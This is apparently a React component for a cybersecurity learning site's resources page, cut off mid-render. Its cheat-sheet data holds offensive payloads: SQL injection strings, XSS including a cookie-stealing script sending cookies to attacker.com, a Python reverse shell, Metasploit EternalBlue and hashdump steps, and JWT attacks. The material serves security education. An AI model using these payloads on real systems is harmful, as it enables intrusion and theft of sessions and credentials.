import { useState } from "react";

// ── Cheat Sheet content (inline preview) ──────────────────────────
const cheatSheets = [
  {
    title: "SQL Injection Cheat Sheet", pages: 8, color: "bg-blue-600", emoji: "🗒️",
    content: [
      { heading: "Authentication Bypass", code: "' OR '1'='1\n' OR '1'='1' --\n' OR 1=1--\nadmin'--\nadmin' #" },
      { heading: "Union-Based Extraction", code: "' UNION SELECT NULL--\n' UNION SELECT NULL,NULL--\n' UNION SELECT username,password FROM users--" },
      { heading: "Error-Based (MySQL)", code: "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--\n' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--" },
      { heading: "Blind Boolean", code: "' AND 1=1--   (true)\n' AND 1=2--   (false)\n' AND SUBSTRING(username,1,1)='a'--" },
      { heading: "Time-Based Blind", code: "'; WAITFOR DELAY '0:0:5'--  (MSSQL)\n' AND SLEEP(5)--             (MySQL)\n'; SELECT pg_sleep(5)--      (PostgreSQL)" },
    ],
  },
  {
    title: "XSS Payload List", pages: 6, color: "bg-red-600", emoji: "🗒️",
    content: [
      { heading: "Basic XSS", code: "<script>alert('XSS')</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>" },
      { heading: "Attribute Injection", code: "\" onmouseover=\"alert(1)\n' onclick='alert(1)'\n javascript:alert(1)" },
      { heading: "Filter Bypass", code: "<ScRiPt>alert(1)</ScRiPt>\n<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>\n<svg/onload=alert`1`>" },
      { heading: "Cookie Stealing", code: "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>" },
      { heading: "DOM-Based XSS", code: "// Vulnerable: document.write(location.hash)\n// Payload: #<script>alert(1)</script>" },
    ],
  },
  {
    title: "Nmap Command Reference", pages: 5, color: "bg-green-600", emoji: "🗒️",
    content: [
      { heading: "Host Discovery", code: "nmap -sn 192.168.1.0/24        # Ping scan\nnmap -Pn 192.168.1.1            # Skip ping\nnmap -PS22,80,443 192.168.1.1  # TCP SYN ping" },
      { heading: "Port Scanning", code: "nmap -sS 192.168.1.1           # SYN scan\nnmap -sT 192.168.1.1           # TCP connect\nnmap -p 80,443,8080 target     # Specific ports\nnmap -p- target                # All 65535 ports" },
      { heading: "Service Detection", code: "nmap -sV target                # Version detection\nnmap -O target                 # OS detection\nnmap -A target                 # Aggressive scan" },
      { heading: "NSE Scripts", code: "nmap --script vuln target\nnmap --script http-enum target\nnmap --script smb-vuln-ms17-010 target" },
    ],
  },
  {
    title: "Linux Commands", pages: 10, color: "bg-yellow-600", emoji: "🗒️",
    content: [
      { heading: "File System", code: "ls -la              # List all files\nfind / -name '*.conf' 2>/dev/null\ngrep -r 'password' /etc\ncat /etc/passwd | cut -d: -f1" },
      { heading: "Network", code: "ifconfig / ip a     # Network interfaces\nnetstat -tulnp      # Open ports\nss -tulnp           # Socket stats\ncurl -I http://target" },
      { heading: "Process & User", code: "ps aux              # All processes\nwhoami && id        # Current user\nsudo -l             # Sudo permissions\ncat /etc/sudoers" },
      { heading: "Privilege Escalation", code: "find / -perm -4000 2>/dev/null   # SUID binaries\nfind / -perm -2000 2>/dev/null   # SGID binaries\ncrontab -l && cat /etc/crontab" },
    ],
  },
  {
    title: "Python for Hacking", pages: 12, color: "bg-purple-600", emoji: "🗒️",
    content: [
      { heading: "Port Scanner", code: "import socket\ndef scan(host, port):\n    s = socket.socket()\n    s.settimeout(1)\n    try:\n        s.connect((host, port))\n        return True\n    except: return False" },
      { heading: "HTTP Requests", code: "import requests\nr = requests.get('http://target', headers={'X-Custom': 'val'})\nprint(r.status_code, r.text[:200])\n\n# POST with data\nr = requests.post(url, data={'user':'admin','pass':'test'})" },
      { heading: "Web Scraping", code: "from bs4 import BeautifulSoup\nsoup = BeautifulSoup(r.text, 'html.parser')\nlinks = [a['href'] for a in soup.find_all('a', href=True)]" },
      { heading: "Reverse Shell", code: "import socket,subprocess,os\ns=socket.socket()\ns.connect(('attacker',4444))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call(['/bin/sh','-i'])" },
    ],
  },
  {
    title: "Metasploit Commands", pages: 7, color: "bg-orange-600", emoji: "🗒️",
    content: [
      { heading: "Basic Commands", code: "msfconsole           # Start Metasploit\nsearch ms17_010      # Search exploits\nuse exploit/windows/smb/ms17_010_eternalblue\nshow options         # Show required options" },
      { heading: "Exploit Setup", code: "set RHOSTS 192.168.1.10\nset LHOST 192.168.1.100\nset LPORT 4444\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit" },
      { heading: "Meterpreter", code: "sysinfo              # System info\ngetuid               # Current user\nhashdump             # Dump hashes\nshell                # Drop to shell\ndownload /etc/passwd /tmp/" },
    ],
  },
  {
    title: "Wireshark Filters", pages: 4, color: "bg-teal-600", emoji: "🗒️",
    content: [
      { heading: "Protocol Filters", code: "http\ndns\nftp\nsmb\ntelnet\nssl or tls" },
      { heading: "IP & Port Filters", code: "ip.addr == 192.168.1.1\nip.src == 10.0.0.1\nip.dst == 10.0.0.2\ntcp.port == 80\nudp.port == 53" },
      { heading: "Content Filters", code: "http.request.method == \"POST\"\nhttp contains \"password\"\ndns.qry.name contains \"google\"\ntcp.flags.syn == 1" },
    ],
  },
  {
    title: "Burp Suite Shortcuts", pages: 3, color: "bg-pink-600", emoji: "🗒️",
    content: [
      { heading: "Navigation", code: "Ctrl+I    — Send to Intruder\nCtrl+R    — Send to Repeater\nCtrl+S    — Send to Scanner\nCtrl+U    — URL encode\nCtrl+Shift+U — URL decode" },
      { heading: "Intruder Attack Types", code: "Sniper    — Single payload, one position\nBattering ram — Same payload, all positions\nPitchfork — Multiple payloads, same index\nCluster bomb — All combinations" },
      { heading: "Useful Extensions", code: "Active Scan++\nAuthorize\nCORS*\nHackBar\nJ2EEScan\nLogger++\nparam-miner" },
    ],
  },
  {
    title: "OWASP Top 10 Summary", pages: 9, color: "bg-blue-700", emoji: "🗒️",
    content: [
      { heading: "A01 - Broken Access Control", code: "• Insecure direct object references\n• Missing function-level access control\n• Fix: Deny by default, verify server-side" },
      { heading: "A02 - Cryptographic Failures", code: "• Weak algorithms (MD5, SHA1)\n• Hardcoded credentials\n• Fix: Use AES-256, bcrypt, TLS 1.3+" },
      { heading: "A03 - Injection", code: "• SQL, NoSQL, OS, LDAP injection\n• Fix: Parameterized queries, input validation" },
      { heading: "A07 - Identification Failures", code: "• Weak passwords allowed\n• No MFA\n• Session fixation\n• Fix: MFA, strong password policy, secure sessions" },
    ],
  },
  {
    title: "JWT Security Guide", pages: 6, color: "bg-indigo-600", emoji: "🗒️",
    content: [
      { heading: "JWT Structure", code: "Header.Payload.Signature\n\n// Header\n{\"alg\": \"HS256\", \"typ\": \"JWT\"}\n\n// Payload\n{\"sub\": \"1234\", \"role\": \"admin\", \"iat\": 1516239022}" },
      { heading: "Common Attacks", code: "// alg:none attack\n{\"alg\": \"none\", \"typ\": \"JWT\"}\n\n// RS256 to HS256 confusion\n// Use public key as HMAC secret\n\n// Brute force weak secrets\nhashcat -a 0 -m 16500 token.txt wordlist.txt" },
      { heading: "Secure JWT Implementation", code: "• Use RS256/ES256 (asymmetric)\n• Set short expiry (15 min access tokens)\n• Validate iss, aud, exp claims\n• Store in httpOnly cookies\n• Implement token rotation" },
    ],
  },
  {
    title: "Cryptography Basics", pages: 8, color: "bg-emerald-600", emoji: "🗒️",
    content: [
      { heading: "Symmetric Encryption", code: "AES-256-GCM  — Recommended\nAES-128-CBC  — Acceptable (use random IV)\nDES/3DES     — Deprecated\n\n// Python AES\nfrom Crypto.Cipher import AES\ncipher = AES.new(key, AES.MODE_GCM)" },
      { heading: "Hashing Algorithms", code: "bcrypt       — Passwords (work factor 12+)\nArgon2       — Passwords (best)\nSHA-256      — File integrity\nSHA-512      — High security\nMD5/SHA1     — BROKEN, do not use" },
      { heading: "Asymmetric Encryption", code: "RSA-2048+    — Key exchange\nECDSA        — Digital signatures\nDH/ECDH      — Key agreement\n\n// Generate RSA keypair\nopenssl genrsa -out private.pem 2048\nopenssl rsa -in private.pem -pubout -out public.pem" },
    ],
  },
  {
    title: "CTF Toolkit", pages: 11, color: "bg-violet-600", emoji: "🗒️",
    content: [
      { heading: "Recon", code: "nmap -A -sC -sV target\ngobuster dir -u http://target -w wordlist.txt\nwfuzz -c -w wordlist.txt http://target/FUZZ\nsubfinder -d target.com" },
      { heading: "Web Exploitation", code: "sqlmap -u 'http://target?id=1' --dbs\nburpsuite            # Intercept/modify requests\nnikto -h http://target\nwpscan --url http://target" },
      { heading: "Crypto / Stego", code: "file challenge.jpg\nstrings challenge.jpg\nbinwalk -e challenge.jpg\nsteghide extract -sf challenge.jpg\nstegsolve challenge.jpg" },
      { heading: "Misc Tools", code: "CyberChef           # Encoding/decoding\nCrackStation        # Hash cracking\ngtfobins.github.io  # PrivEsc\nrevshells.com       # Reverse shells" },
    ],
  },
];

// ── Video data with real YouTube embed IDs ─────────────────────────
const videos = [
  {
    title: "Introduction to Kali Linux",
    duration: "45 min", level: "Beginner", views: "12K",
    gradient: "from-blue-900 to-slate-900",
    desc: "Full guide to setting up and using Kali Linux for penetration testing.",
    youtubeId: "lZAoFs75_cs",
  },
  {
    title: "Burp Suite Complete Guide",
    duration: "1h 20min", level: "Intermediate", views: "8.5K",
    gradient: "from-purple-900 to-slate-900",
    desc: "Learn to intercept, modify and replay HTTP requests with Burp Suite.",
    youtubeId: "G3hpAeoZ4ek",
  },
  {
    title: "Nmap Master Class",
    duration: "55 min", level: "Beginner", views: "15K",
    gradient: "from-green-900 to-slate-900",
    desc: "Complete Nmap guide from basic scanning to advanced NSE scripts.",
    youtubeId: "4t4kBkMsDbQ",
  },
  {
    title: "Web App Pentesting Walkthrough",
    duration: "2h 10min", level: "Advanced", views: "6K",
    gradient: "from-red-900 to-slate-900",
    desc: "End-to-end web application penetration test against a real target.",
    youtubeId: "jmgsgjPn1vs",
  },
  {
    title: "CTF Beginner's Guide",
    duration: "1h", level: "Beginner", views: "20K",
    gradient: "from-orange-900 to-slate-900",
    desc: "How to approach and solve CTF challenges across all categories.",
    youtubeId: "Lus7aNf2xDg",
  },
  {
    title: "Metasploit Framework Deep Dive",
    duration: "1h 35min", level: "Advanced", views: "9K",
    gradient: "from-rose-900 to-slate-900",
    desc: "Master Metasploit from basic exploitation to post-exploitation.",
    youtubeId: "8lR27r8Y3oe",
  },
  {
    title: "Wireshark Network Analysis",
    duration: "50 min", level: "Intermediate", views: "11K",
    gradient: "from-teal-900 to-slate-900",
    desc: "Capture and analyse network traffic to detect attacks and anomalies.",
    youtubeId: "lb1Dw0elw0Q",
  },
  {
    title: "Social Engineering Techniques",
    duration: "40 min", level: "Intermediate", views: "7K",
    gradient: "from-indigo-900 to-slate-900",
    desc: "Understand phishing, pretexting, and human-based attack vectors.",
    youtubeId: "PWVN3Rq4gzw",
  },
];

const books = [
  { title: "The Web Application Hacker's Handbook", author: "Stuttard & Pinto", category: "Web Security", color: "border-blue-500", url: "https://www.amazon.com/s?k=Web+Application+Hackers+Handbook" },
  { title: "Hacking: The Art of Exploitation", author: "Jon Erickson", category: "Systems", color: "border-red-500", url: "https://www.amazon.com/s?k=Hacking+Art+of+Exploitation" },
  { title: "Penetration Testing", author: "Georgia Weidman", category: "Pentesting", color: "border-green-500", url: "https://www.amazon.com/s?k=Penetration+Testing+Georgia+Weidman" },
  { title: "The Hacker Playbook 3", author: "Peter Kim", category: "Red Teaming", color: "border-orange-500", url: "https://www.amazon.com/s?k=Hacker+Playbook+3" },
  { title: "Metasploit: The Penetration Tester's Guide", author: "Kennedy et al.", category: "Exploitation", color: "border-purple-500", url: "https://www.amazon.com/s?k=Metasploit+Penetration+Testers+Guide" },
  { title: "Network Security Assessment", author: "Chris McNab", category: "Networking", color: "border-teal-500", url: "https://www.amazon.com/s?k=Network+Security+Assessment+McNab" },
  { title: "Black Hat Python", author: "Justin Seitz", category: "Python/Scripting", color: "border-yellow-500", url: "https://www.amazon.com/s?k=Black+Hat+Python" },
  { title: "Real-World Bug Hunting", author: "Peter Yaworski", category: "Bug Bounty", color: "border-pink-500", url: "https://www.amazon.com/s?k=Real+World+Bug+Hunting+Yaworski" },
];

const tools = [
  { name: "Shodan", desc: "Search engine for internet-connected devices", icon: "🔍", cat: "Recon", url: "https://www.shodan.io" },
  { name: "VirusTotal", desc: "Analyze suspicious files and URLs", icon: "🛡️", cat: "Analysis", url: "https://www.virustotal.com" },
  { name: "GTFOBins", desc: "Unix binaries for privilege escalation", icon: "⬆️", cat: "PrivEsc", url: "https://gtfobins.github.io" },
  { name: "LOLBAS", desc: "Windows living-off-the-land binaries", icon: "💻", cat: "Windows", url: "https://lolbas-project.github.io" },
  { name: "CyberChef", desc: "Data encoding/decoding swiss army knife", icon: "🔧", cat: "Utility", url: "https://gchq.github.io/CyberChef" },
  { name: "JWT.io", desc: "Decode and verify JWT tokens", icon: "🔑", cat: "Web", url: "https://jwt.io" },
  { name: "HaveIBeenPwned", desc: "Check if your email was breached", icon: "📧", cat: "OSINT", url: "https://haveibeenpwned.com" },
  { name: "Exploit-DB", desc: "Database of public exploits", icon: "💥", cat: "Exploits", url: "https://www.exploit-db.com" },
  { name: "SecurityHeaders", desc: "Analyze HTTP security headers", icon: "🔒", cat: "Web", url: "https://securityheaders.com" },
];

const platforms = [
  { name: "TryHackMe", initials: "THM", desc: "Beginner-friendly guided cybersecurity rooms", price: "Free + Premium", dot: "bg-green-500", color: "bg-green-900/30", url: "https://tryhackme.com" },
  { name: "HackTheBox", initials: "HTB", desc: "Advanced CTF-style pentesting challenges", price: "Free + VIP", dot: "bg-blue-500", color: "bg-blue-900/30", url: "https://hacktheboxacademy.com" },
  { name: "PentesterLab", initials: "PL", desc: "Web security exercises with solutions", price: "Free + Pro", dot: "bg-yellow-500", color: "bg-yellow-900/30", url: "https://pentesterlab.com" },
  { name: "PortSwigger Web Security Academy", initials: "PS", desc: "Free web security training by Burp Suite creators", price: "Free", dot: "bg-red-500", color: "bg-red-900/30", url: "https://portswigger.net/web-security" },
  { name: "VulnHub", initials: "VH", desc: "Download vulnerable VMs for offline practice", price: "Free", dot: "bg-orange-500", color: "bg-orange-900/30", url: "https://www.vulnhub.com" },
  { name: "OWASP WebGoat", initials: "OW", desc: "Deliberately insecure web app for training", price: "Free", dot: "bg-purple-500", color: "bg-purple-900/30", url: "https://owasp.org/www-project-webgoat" },
];

const levelColor = {
  Beginner: "bg-green-600/20 text-green-400 border border-green-500/30",
  Intermediate: "bg-blue-600/20 text-blue-400 border border-blue-500/30",
  Advanced: "bg-orange-600/20 text-orange-400 border border-orange-500/30",
};

// ── PDF Preview Modal ─────────────────────────────────────────────
function PdfModal({ sheet, mode, onClose }) {
  // mode: "preview" | "download"
  const handleDownload = () => {
    const lines = sheet.content.flatMap((s) => [
      `\n=== ${s.heading} ===\n`,
      s.code,
      "\n",
    ]);
    const text = `${sheet.title}\n${"=".repeat(sheet.title.length)}\n${lines.join("\n")}`;
    const blob = new Blob([text], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = sheet.title.replace(/\s+/g, "_") + ".txt";
    a.click();
    URL.revokeObjectURL(url);
  };

  // auto-download if mode is download
  if (mode === "download") {
    handleDownload();
    onClose();
    return null;
  }

  return (
    <div
      className="fixed inset-0 z-50 bg-black/80 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <div
        className="bg-[#0e1628] border border-white/10 rounded-2xl w-full max-w-2xl max-h-[85vh] flex flex-col"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="flex items-center justify-between p-5 border-b border-white/10 flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className={`w-9 h-9 ${sheet.color} rounded-xl flex items-center justify-center text-lg`}>
              {sheet.emoji}
            </div>
            <div>
              <h2 className="text-base font-bold text-white">{sheet.title}</h2>
              <p className="text-xs text-gray-500">PDF · {sheet.pages} pages</p>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <button
              onClick={handleDownload}
              className="flex items-center gap-1.5 bg-blue-600 hover:bg-blue-700 text-white text-xs font-semibold px-4 py-2 rounded-xl transition-colors"
            >
              <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                <polyline points="7 10 12 15 17 10"/>
                <line x1="12" y1="15" x2="12" y2="3"/>
              </svg>
              Download
            </button>
            <button onClick={onClose} className="text-gray-400 hover:text-white transition-colors p-1">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
              </svg>
            </button>
          </div>
        </div>

        {/* Content */}
        <div className="overflow-y-auto p-5 flex flex-col gap-5">
          {sheet.content.map((section, i) => (
            <div key={i}>
              <h3 className="text-xs font-bold text-blue-400 uppercase tracking-wider mb-2">
                {section.heading}
              </h3>
              <pre className="bg-[#070d1b] border border-white/5 rounded-xl p-4 text-xs text-green-400 font-mono leading-relaxed overflow-x-auto whitespace-pre-wrap">
                {section.code}
              </pre>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
}

// ── Video Player Modal ────────────────────────────────────────────
function VideoModal({ video, onClose }) {
  return (
    <div
      className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-4"
      onClick={onClose}
    >
      <div
        className="bg-[#0e1628] border border-white/10 rounded-2xl w-full max-w-3xl flex flex-col"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="flex items-center justify-between p-4 border-b border-white/10">
          <div>
            <h2 className="text-base font-bold text-white">{video.title}</h2>
            <div className="flex items-center gap-3 mt-1">
              <span className={`text-xs font-semibold px-2 py-0.5 rounded-full ${levelColor[video.level]}`}>
                {video.level}
              </span>
              <span className="text-xs text-gray-500">{video.duration}</span>
              <span className="text-xs text-gray-500">{video.views} views</span>
            </div>
          </div>
          <button onClick={onClose} className="text-gray-400 hover:text-white transition-colors p-1 flex-shrink-0">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>
            </svg>
          </button>
        </div>

        {/* YouTube Embed */}
        <div className="relative" style={{ paddingBottom: "56.25%" }}>
          <iframe
            className="absolute inset-0 w-full h-full rounded-b-2xl"
            src={`https://www.youtube.com/embed/${video.youtubeId}?autoplay=1&rel=0&modestbranding=1`}
            title={video.title}
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
            allowFullScreen
          />
        </div>

        {/* Description */}
        <div className="p-4 border-t border-white/5">
          <p className="text-sm text-gray-400">{video.desc}</p>
        </div>
      </div>
    </div>
  );
}

// ── Main Resources Component ──────────────────────────────────────
function Resources() {
  const [pdfModal, setPdfModal] = useState(null);   // { sheet, mode }
  const [videoModal, setVideoModal] = useState(null); // video object

  return (
    <div className="bg-[#070d1b] min-h-screen text-white pt-20 pb-16">
      {/* Modals */}
      {pdfModal && (
        <PdfModal
          sheet={pdfModal.sheet}
          mode={pdfModal.mode}
          onClose={() => setPdfModal(null)}
        />
      )}
      {videoModal && (
        <VideoModal
          video={videoModal}
          onClose={() => setVideoModal(null)}
        />
      )}

      <div className="max-w-7xl mx-auto px-6">
        {/* Header */}
        <div className="text-center mb-12 pt-6">
          <span className="inline-flex items-center gap-1.5 bg-purple-600/10 border border-purple-500/20 text-purple-300 text-xs font-medium px-3 py-1 rounded-full mb-4">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M4 19.5A2.5 2.5 0 016.5 17H20"/>
              <path d="M6.5 2H20v20H6.5A2.5 2.5 0 014 19.5v-15A2.5 2.5 0 016.5 2z"/>
            </svg>
            Learning Hub
          </span>
          <h1 className="text-4xl font-extrabold text-white mb-3">Learning Resources</h1>
          <p className="text-gray-400 max-w-xl mx-auto text-sm">
            Everything you need to master cybersecurity — cheat sheets, videos, books, tools, and practice platforms.
          </p>
        </div>

        {/* ── Section 1: Cheat Sheets ─────────────────────────── */}
        <section className="mb-14">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-8 h-8 bg-blue-600/20 rounded-lg flex items-center justify-center">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" strokeWidth="2">
                <path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z"/>
                <polyline points="14 2 14 8 20 8"/>
              </svg>
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">Quick Reference Cheat Sheets</h2>
              <p className="text-gray-500 text-xs">Click Preview to read inline — Download saves a .txt file</p>
            </div>
          </div>
          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-4">
            {cheatSheets.map((cs) => (
              <div
                key={cs.title}
                className="bg-[#0e1628] border border-white/5 rounded-2xl p-5 hover:border-blue-500/20 transition-all group flex flex-col gap-3"
              >
                <div className={`w-10 h-10 ${cs.color} rounded-xl flex items-center justify-center text-xl`}>
                  {cs.emoji}
                </div>
                <div className="flex-1">
                  <h3 className="text-sm font-bold text-white group-hover:text-blue-400 transition-colors leading-snug">
                    {cs.title}
                  </h3>
                  <p className="text-xs text-gray-500 mt-1">PDF · {cs.pages} pages</p>
                </div>
                <div className="flex gap-2">
                  <button
                    onClick={() => setPdfModal({ sheet: cs, mode: "download" })}
                    className="flex-1 bg-blue-600 hover:bg-blue-700 text-white text-xs font-semibold py-2 rounded-lg transition-colors flex items-center justify-center gap-1"
                  >
                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                      <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/>
                      <polyline points="7 10 12 15 17 10"/>
                      <line x1="12" y1="15" x2="12" y2="3"/>
                    </svg>
                    Download
                  </button>
                  <button
                    onClick={() => setPdfModal({ sheet: cs, mode: "preview" })}
                    className="flex-1 bg-white/5 hover:bg-white/10 text-gray-300 text-xs font-semibold py-2 rounded-lg border border-white/10 transition-colors flex items-center justify-center gap-1"
                  >
                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
                      <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                      <circle cx="12" cy="12" r="3"/>
                    </svg>
                    Preview
                  </button>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* ── Section 2: Video Tutorials ────────────────────────── */}
        <section className="mb-14">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-8 h-8 bg-red-600/20 rounded-lg flex items-center justify-center">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#f87171" strokeWidth="2">
                <polygon points="23 7 16 12 23 17 23 7"/>
                <rect x="1" y="5" width="15" height="14" rx="2" ry="2"/>
              </svg>
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">Video Tutorials</h2>
              <p className="text-gray-500 text-xs">Click Watch Now to play the video in an embedded player</p>
            </div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-5">
            {videos.map((v) => (
              <div
                key={v.title}
                className="bg-[#0e1628] border border-white/5 rounded-2xl overflow-hidden hover:border-blue-500/20 transition-all group flex flex-col"
              >
                {/* Thumbnail — click opens modal */}
                <button
                  onClick={() => setVideoModal(v)}
                  className="relative h-40 w-full bg-gradient-to-br flex items-center justify-center cursor-pointer focus:outline-none"
                  style={{ background: `linear-gradient(135deg, var(--tw-gradient-from), var(--tw-gradient-to))` }}
                >
                  <div className={`absolute inset-0 bg-gradient-to-br ${v.gradient}`} />
                  <div className="relative z-10 w-14 h-14 bg-white/20 backdrop-blur-sm rounded-full flex items-center justify-center border border-white/30 group-hover:bg-white/35 group-hover:scale-110 transition-all">
                    <svg width="22" height="22" viewBox="0 0 24 24" fill="white" className="ml-1">
                      <polygon points="5 3 19 12 5 21 5 3"/>
                    </svg>
                  </div>
                  <span className="absolute bottom-3 right-3 bg-black/70 text-white text-xs px-2 py-0.5 rounded font-mono">
                    {v.duration}
                  </span>
                </button>

                <div className="p-4 flex flex-col gap-2 flex-1">
                  <h3 className="text-sm font-bold text-white group-hover:text-blue-400 transition-colors leading-snug">
                    {v.title}
                  </h3>
                  <p className="text-xs text-gray-500 leading-relaxed flex-1">{v.desc}</p>
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className={`text-xs font-semibold px-2 py-0.5 rounded-full ${levelColor[v.level]}`}>
                      {v.level}
                    </span>
                    <span className="text-xs text-gray-500 flex items-center gap-1">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                        <circle cx="12" cy="12" r="3"/>
                      </svg>
                      {v.views} views
                    </span>
                  </div>
                  <button
                    onClick={() => setVideoModal(v)}
                    className="mt-1 bg-blue-600 hover:bg-blue-700 text-white text-xs font-semibold py-2.5 rounded-xl transition-colors flex items-center justify-center gap-1.5"
                  >
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="white">
                      <polygon points="5 3 19 12 5 21 5 3"/>
                    </svg>
                    Watch Now
                  </button>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* ── Section 3: Books ─────────────────────────────────── */}
        <section className="mb-14">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-8 h-8 bg-yellow-600/20 rounded-lg flex items-center justify-center">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#fbbf24" strokeWidth="2">
                <path d="M4 19.5A2.5 2.5 0 016.5 17H20"/>
                <path d="M6.5 2H20v20H6.5A2.5 2.5 0 014 19.5v-15A2.5 2.5 0 016.5 2z"/>
              </svg>
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">Recommended Books</h2>
              <p className="text-gray-500 text-xs">Essential reading for every security practitioner</p>
            </div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
            {books.map((book) => (
              <div
                key={book.title}
                className={`bg-[#0e1628] border border-white/5 rounded-2xl overflow-hidden hover:border-blue-500/20 transition-all group flex flex-col border-l-4 ${book.color}`}
              >
                <div className="p-5 flex flex-col gap-2 flex-1">
                  <h3 className="text-sm font-bold text-white group-hover:text-blue-400 transition-colors leading-snug">
                    {book.title}
                  </h3>
                  <p className="text-xs text-gray-400">{book.author}</p>
                  <span className="inline-block bg-white/5 border border-white/10 text-gray-400 text-xs px-2.5 py-0.5 rounded-full w-fit mt-1">
                    {book.category}
                  </span>
                </div>
                <div className="px-5 pb-4">
                  <a
                    href={book.url}
                    target="_blank"
                    rel="noreferrer"
                    className="text-xs text-blue-400 hover:text-blue-300 font-medium transition-colors flex items-center gap-1"
                  >
                    View on Amazon →
                  </a>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* ── Section 4: Online Tools ──────────────────────────── */}
        <section className="mb-14">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-8 h-8 bg-green-600/20 rounded-lg flex items-center justify-center">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#34d399" strokeWidth="2">
                <path d="M14.7 6.3a1 1 0 000 1.4l1.6 1.6a1 1 0 001.4 0l3.77-3.77a6 6 0 01-7.94 7.94l-6.91 6.91a2.12 2.12 0 01-3-3l6.91-6.91a6 6 0 017.94-7.94l-3.76 3.76z"/>
              </svg>
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">Online Tools</h2>
              <p className="text-gray-500 text-xs">Free browser-based security tools — click to open in new tab</p>
            </div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-4">
            {tools.map((t) => (
              <div
                key={t.name}
                className="bg-[#0e1628] border border-white/5 rounded-2xl p-5 hover:border-blue-500/20 transition-all group flex flex-col gap-3"
              >
                <div className="flex items-start gap-3">
                  <span className="text-2xl flex-shrink-0">{t.icon}</span>
                  <div className="flex-1">
                    <h3 className="text-sm font-bold text-white group-hover:text-blue-400 transition-colors">
                      {t.name}
                    </h3>
                    <p className="text-xs text-gray-400 mt-1">{t.desc}</p>
                  </div>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-xs bg-white/5 border border-white/10 text-gray-400 px-2.5 py-0.5 rounded-full">
                    {t.cat}
                  </span>
                  <a
                    href={t.url}
                    target="_blank"
                    rel="noreferrer"
                    className="text-xs bg-blue-600 hover:bg-blue-700 text-white font-medium px-4 py-1.5 rounded-lg transition-colors flex items-center gap-1"
                  >
                    Open Tool →
                  </a>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* ── Section 5: Practice Platforms ────────────────────── */}
        <section className="pb-4">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-8 h-8 bg-purple-600/20 rounded-lg flex items-center justify-center">
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" strokeWidth="2">
                <rect x="2" y="3" width="20" height="14" rx="2" ry="2"/>
                <line x1="8" y1="21" x2="16" y2="21"/>
                <line x1="12" y1="17" x2="12" y2="21"/>
              </svg>
            </div>
            <div>
              <h2 className="text-xl font-bold text-white">Practice Platforms</h2>
              <p className="text-gray-500 text-xs">The best platforms to hone your hacking skills</p>
            </div>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
            {platforms.map((p) => (
              <div
                key={p.name}
